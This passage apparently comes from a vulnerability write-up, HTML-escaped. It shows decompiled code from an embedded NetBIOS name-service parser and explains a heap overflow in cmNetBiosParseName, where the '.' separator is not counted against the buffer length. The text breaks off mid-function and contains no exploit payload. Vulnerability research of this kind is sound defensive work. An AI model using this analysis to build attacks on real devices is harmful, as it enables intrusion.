&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; does not calculate the length of the domain name correctly. It will copy the domain name to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buff&lt;/code&gt;, which leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
